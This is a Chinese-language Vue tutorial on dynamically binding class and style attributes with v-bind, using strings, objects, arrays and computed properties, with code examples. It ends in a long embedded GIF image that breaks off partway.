在实际的项目开发中，对于元素的`class`属性与`style`属性的操作是非常常见的需求。因为`class`与`style`都属于元素的属性，所以我们同样是利用`v-bind`来将他们与动态的字符串绑定。

因为`class`与`style`属性在操作时相对较复杂，所以`v-bind`指令在动态绑定`class`与`style`属性值时，其表达式的值除了 **“字符串“** 外，还可以是 **”对象或数组”**。

### 1、动态绑定 class 类

我们可以使用`v-bind:class`（简写`:class`）为元素动态绑定`class`的值

> `:class`绑定的值可以是：

- 字符串
- 对象
- 数组

三者中的一种

### 1.1、绑定字符串

我们可以给`v-bind:class`（缩写`:class`）传递一个字符串类型的变量，为元素动态添加`class`属性值

```vue
<script>
export default {
  data() {
    return {
      className: "bg-red",
    };
  },
};
</script>

<template>
  <!--最终渲染后元素的 class='bg-red'-->
  <div :class="className">box</div>
</template>
```

> 以下写法，`vue`最终自动`:class` 与`class`中的值合并在一起

```html
<div :class="className" class="basic"></div>

<!--以上写法，最终渲染后结果如下-->
<div class="bg-red baisc"></div>
```

**代码示例**

```vue
<script>
export default {
  data() {
    return {
      className: "bg-red",
    };
  },
  methods: {
    changeColor() {
      this.className = "bg-blue";
    },
  },
};
</script>

<template>
  <div :class="className" class="basic" @click="changeColor">box</div>
</template>

<style>
.basic {
  width: 100px;
  height: 100px;
  border: 2px solid #000;
}

.bg-red {
  background-color: red;
}

.bg-blue {
  background-color: skyblue;
}
</style>
```

注：

以上代码表示，初始渲染时，`div`元素身上的`class="basic bg-red"`，当点击`div`时，元素的`class="basic bg-blue"`。

> 具体效果如下：

![GIF2023-4-2820-30-54](https://www.arryblog.com/assets/img/GIF2023-4-2820-30-54.884c5c37.gif)

### 1.2、绑定对象

如果`:class`绑定的值为一个对象

- 对象属性的值为`true`时，则对象的属性名会渲染成元素`class`属性中的值
- 如果对象属性的值为`false`，则该属性名不会出现在`class`属性中。

```html
<div class="basic" :class="{ bgColor: true, radius: false }">box</div>
<!--以上写法，最终渲染结果如下-->
<div class="basic bgColor">box</div>
```

**代码演示**

```vue
<template>
  <div class="basic" :class="{ bgColor: true, radius: false }">box</div>
</template>

<style>
.basic {
  width: 100px;
  height: 100px;
  border: 2px solid #000;
}

.bgColor {
  background-color: red;
}

.radius {
  border-radius: 20px;
}
</style>
```

> 以上代码编译后，最终显示效果如下：

![image-20230428204249691](https://www.arryblog.com/assets/img/image-20230428204249691.a81c05fe.png)

我们将对象属性后面值改为变量，这样就可以通过 JS 来动态操作是否添加对应的`class`

```vue
<script>
export default {
  data() {
    return {
      isColor: true,
      isRadius: false,
    };
  },
  methods: {
    changeClass() {
      this.isRadius = true;
    },
  },
};
</script>

<template>
  <div
    class="basic"
    :class="{ bgColor: isColor, radius: isRadius }"
    @click="changeClass"
  >
    box
  </div>
</template>

<style>
.basic {
  width: 100px;
  height: 100px;
  border: 2px solid #000;
}

.bgColor {
  background-color: red;
}

.radius {
  border-radius: 20px;
}
</style>
```

注：

以上代码初始渲染后，`div`元素的`class="basic bgColor"`，当点击`div`元素后`class="basic bgColor isRadius"`

> 具体效果如下：

![GIF2023-4-2820-53-34](https://www.arryblog.com/assets/img/GIF2023-4-2820-53-34.acdc97f5.gif)

我们也可以将`:class`后面字面量形式的对象，改为一个变量，这个变量的值是一个对象

```vue
<script>
export default {
  data() {
    return {
      className: {
        bgColor: true,
        radius: false,
      },
    };
  },
  methods: {
    changeClass() {
      this.className.radius = true;
    },
  },
};
</script>

<template>
  <div class="basic" :class="className" @click="changeClass">box</div>
</template>

<style>
.basic {
  width: 100px;
  height: 100px;
  border: 2px solid #000;
}

.bgColor {
  background-color: red;
}

.radius {
  border-radius: 20px;
}
</style>
```

> 以上代码渲染出来的结果，与上面动态绑定的效果是一样的。

### 1.3、绑定数组

如果`:class`绑定的值为一个数组，数组中的每个成员都是一个字符串，那数组中的每个成员都会渲染成`class`属性的值

```html
<div class="basic" :class='[" bgColor", "radius"]'></div>

<!--以上写法，最终渲染后效果如下-->
<div class="basic bgColor radius"></div>
```

- 如果想通过 JS 来动态操作 class 的属性值，我们可以将数组中的每个成员，改成变量，如下：

```html
<script>
  export default {
    data() {
      return {
        isBgColor: "bgColor",
        isRadius: "radius",
      };
    },
  };
</script>

<template>
  <div class="basic" :class="[isBgColor, isRadius]"></div>
</template>
```

- 在实际开发中，上面这种方式还不是最优的，我们还可以直接绑定一个数组类型的变量，这样我们就可以通过 JS 操作数组中的成员来实现对 class 的新增、删除、更新。

```html
<script>
  export default {
    data() {
      return {
        arrClass: ["bgColor", "radius"],
      };
    },
    methods: {
      removeClass() {
        // 删除数组中最后一个元素
        this.arrClass.pop();
      },
    },
  };
</script>

<template>
  <div class="basic" :class="arrClass" @click="removeClass"></div>
</template>
```

- 也可以在数组中通过三元表达式有条件的渲染某个 class

```html
<!--
	以下写法表示：
		如果 isRadius为true,则向class中添加radius和bgColor，否则只添加bgColor
-->
<div class="basic" :class="[isRadius ? 'radius' : '', 'bgColor']"></div>
```

- 如果有多个依赖条件的`class`,则代码显的有些冗长，因此也可以在数组中嵌套对象

```html
<div class="basic" :class="[{ radius: isRadius }, 'bgColor']"></div>
```

### 1.4、总结

`v-bind`指令动态绑定 class 属性的值，其值可以：字符串、对象、数组中的任意一种

```html
<!-- 值为字符串 -->
<div :class="className">box</div>

<!--值为js对象 对象属性的值为true,则属性名会被添加到class中-->
<div :class="{ bgColor: true, radius: false }">box</div>
<!--bool变量为布尔类型，true表示class='bgColor' false表示 class='' -->
<div :class="{bgColor:bool}"></div>
<!--classObj变量的值是一个对象-->
<div :class="classObj"></div>

<!--值为数组-->
<!--数组中成员都为字符串，则数组中每个成员都会成为class的值-->
<div class="basic" :class='[" bgColor", "radius"]'></div>
<!-- isBgColor和 isRadius为变量-->
<div class="basic" :class="[isBgColor, isRadius]"></div>
<!--数组可以通过三元表达式有条件的渲染class-->
<div class="basic" :class="[isRadius ? 'radius' : '', 'bgColor']"></div>
<!--数组中的成员可以是一个对象-->
<div class="basic" :class="[{ radius: isRadius }, 'bgColor']"></div>
```

### 2、动态绑定 style 样式

我们可以通过`v-bind:style`（简写`:style`）来动态为元素添加`style`样式属性。

> `:style`绑定的值可以是：

- 样式字符串
- 样式对象
- 样式数组（数组中每个成员是一个样式类型的对象）

### 2.1、绑定样式字符串

`:style`后的值为一个标准的 CSS 样式字符串

```vue
<script>
export default {
  data() {
    return {
      styleCss: "color:red;font-size:30px",
    };
  },
};
</script>

<template>
  <div :style="styleCss">style样式绑定</div>
</template>
```

> 编译后结果如下：

```html
<div style="color: red; font-size: 30px;">style样式绑定</div>
```

### 2.2、绑定样式对象

`:style`后绑定的值为一个样式对象，即：对象中属性为 CSS 属性名，属性名推荐`camelCase`写法，但也支持`kebab-cased`写法。

```html
<script>
  export default {
    data() {
      return {
        activeColor: "red",
        fontSize: "30px",
      };
    },
  };
</script>

<template>
  <div :style="{ color: activeColor, 'font-size': fontSize }">
    style样式绑定
  </div>
  <!--以下写法为官方推荐写法，属性名采用 camelCase 写法-->
  <div :style="{ color: activeColor, fontSize: fontSize }">style样式绑定</div>
</template>
```

> 编译后的结果如下：

```html
<div style="color: red; font-size: 30px;">style样式绑定</div>
```

`:style`后直接绑定一个变量，变量的值是一个样式对象。（此方式为最优绑定方式）

```vue
<script>
export default {
  data() {
    return {
      styleObject: {
        color: "red",
        fontSize: "30px",
      },
    };
  },
};
</script>

<template>
  <div :style="styleObject">style样式绑定</div>
</template>
```

> 编译后结果同上。

### 2.3、绑定样式数组

`:style`后绑定的值为一个数组，数组中的成员可以是一个样式对象，也可以是一个样式字符串，最终这些样式都会合并渲染到同一元素上。

```vue
<script>
export default {
  data() {
    return {
      // 基础样式
      baseStyles: {
        width: "100px",
        height: "100px",
        backgroundColor: "skyblue",
      },
      // 激活后样式
      activeStyles: {
        fontSize: "20px",
        color: "red",
      },
    };
  },
};
</script>

<template>
  <div :style="[baseStyles, activeStyles, 'border-radius:50%']">
    style样式绑定
  </div>
</template>
```

> 编译后的结果如下：

```html
<div
  style="width: 100px; height: 100px; background-color: skyblue; font-size: 30px; color: red;border-radius:50%"
>
  style样式绑定
</div>
```

### 2.4、总结

`v-bind`指令动态绑定 style 属性的值，其值可以是：样式字符串、样式对象、样式数组

```html
<!--样式字符串-->
<div :style="styleCss">style样式绑定</div>

<!--样式对象-->
<div :style="{ color: activeColor, 'font-size': fontSize }">style样式绑定</div>

<!--样式数组  baseStyles与activeStyles为样式对象或样式字符串-->
<div :style="[baseStyles, activeStyles]">style样式绑定</div>
```

### 3、:class 与 :style 与 计算属性

如果`:class`或`:style`后绑定的值需要经过相对复杂的逻辑运算才能得到，可以利用计算属性来实现。

`:class`或`:style`后面直接绑定计算属性，计算属性的值为一个合格的 ”**字符串 或 对象或数组**"

```vue
<script>
export default {
  data() {
    return {
      skinTheme: "skyblue",
    };
  },
  computed: {
    // 计算属性
    skinStyle() {
      if (this.skinTheme === "skyblue") {
        return ["skyblue-bg", "border-radius"];
      } else if (this.skinTheme === "yellow") {
        return ["yellow-bg", "border10"];
      } else {
        return ["pink-bg"];
      }
    },
  },
};
</script>
<template>
  <select v-model="skinTheme">
    <option>skyblue</option>
    <option>yellow</option>
    <option>pink</option>
  </select>
  <div :class="skinStyle" class="basic"></div>
</template>

<style scoped>
.basic {
  width: 100px;
  height: 100px;
}

.skyblue-bg {
  background-color: skyblue;
}

.yellow-bg {
  background-color: khaki;
}

.pink-bg {
  background-color: pink;
}

.border-radius {
  border-radius: 50%;
}

.border10 {
  border: 10px solid red;
}
</style>
```

> 以上代码，最终效果如下：

![GIF2023-5-517-02-18](https://www.arryblog.com/assets/img/GIF2023-5-517-02-18.0784f53c.gif)

### 4、案例：开关效果

![GIF2023-6-1519-58-29](data:image/gif;base64,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